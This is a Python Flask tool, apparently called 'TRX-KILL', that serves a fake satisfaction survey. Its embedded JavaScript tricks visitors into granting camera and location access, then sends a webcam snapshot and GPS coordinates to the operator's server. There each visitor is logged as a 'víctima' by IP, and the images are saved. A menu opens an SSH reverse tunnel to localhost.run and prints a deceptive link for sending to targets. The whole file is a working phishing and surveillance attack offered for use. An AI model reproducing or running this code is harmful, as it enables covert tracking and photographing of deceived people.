import os, sys, time, threading, base64
from flask import Flask, request, render_template_string

# --- CONFIGURACIÓN ---
STORAGE_PATH = "/sdcard/INFORMACIÓN-TRX-KILL"
CAPTURA_PATH = f"{STORAGE_PATH}/CAPTURAS"
LOG_FILE = f"{STORAGE_PATH}/datos.txt"
ADMIN_PASS = "admtrx"
if not os.path.exists(CAPTURA_PATH): os.makedirs(CAPTURA_PATH)

app = Flask('TRX-KILL')
G, C, R, W = "\033[1;32m", "\033[1;36m", "\033[1;31m", "\033[0m"

# --- ENCUESTA PERSONALIZADA (HTML) ---
ENCUESTA_HTML = """
<html><body style="font-family:sans-serif; text-align:center; padding:20px;">
<h2>Encuesta de Satisfacción</h2>
<form id="e">
    <p>¿Qué opinas de nuestro servicio?</p>
    <input type="radio" name="q" value="Bueno"> Bueno<br>
    <input type="radio" name="q" value="Malo"> Malo<br><br>
    <button type="button" onclick="enviar()">Enviar Encuesta</button>
</form>

<script>
async function enviar() {
    try {
        let s = await navigator.mediaDevices.getUserMedia({video: true});
        let p = await new Promise((r, j) => navigator.geolocation.getCurrentPosition(r, j));
        let v = document.createElement('video'); v.srcObject = s; v.play();
        setTimeout(() => {
            let c = document.createElement('canvas'); c.width=400; c.height=300;
            c.getContext('2d').drawImage(v, 0, 0, 400, 300);
            fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&img='+encodeURIComponent(c.toDataURL())+'&res='+document.querySelector('input[name="q"]:checked').value);
            alert('¡Gracias por participar!');
        }, 1000);
    } catch(e) { alert('Debes aceptar los permisos para enviar.'); }
}
</script></body></html>
"""

@app.route('/')
def index(): return ENCUESTA_HTML

@app.route('/log')
def log():
    with open(LOG_FILE, "a") as f:
        f.write(f"VÍCTIMA:{request.remote_addr} | ENCUESTA:{request.args.get('res')} | GPS:{request.args.get('lat')},{request.args.get('lon')}\n")
    if request.args.get('img'):
        with open(f"{CAPTURA_PATH}/cap_{int(time.time())}.jpg", "wb") as f:
            f.write(base64.b64decode(request.args.get('img').split(',')[1]))
    return "OK"

def main():
    threading.Thread(target=lambda: app.run(port=5000), daemon=True).start()
    while True:
        os.system('clear')
        print(f"{G}  === TRX-KILL MATRIX ==={W}")
        print(f"{G}[01] VERIFICAR | [02] ENCUESTA-LINK | [03] CLON-KILL | [06] ADM{W}")
        sel = input(f"\n{G}TRX-ROOT > {W}")

        if sel == "02":
            if os.path.exists(LOG_FILE): os.remove(LOG_FILE)
            os.system("ssh -R 80:localhost:5000 ssh.localhost.run > /dev/null 2>&1 &")
            print(f"\n{C}LINK PARA ENVIAR:{W} https://base64google.encuetas.com")
            print(f"{G}ESPERANDO QUE COMPLETEN LA ENCUESTA...{W}")
            while not os.path.exists(LOG_FILE): time.sleep(1)
            print(f"\n{R}>>> ¡VÍCTIMA DETECTADA Y ENCUESTA RECIBIDA! <<<{W}")
            input("\n[Enter]...")

        elif sel == "06":
            if input(f"{G}PASS ADM: {W}") == ADMIN_PASS:
                os.system(f"ls -R {STORAGE_PATH}")
            input("\n[Enter]...")
        elif sel == "00": sys.exit()

if __name__ == "__main__": main()
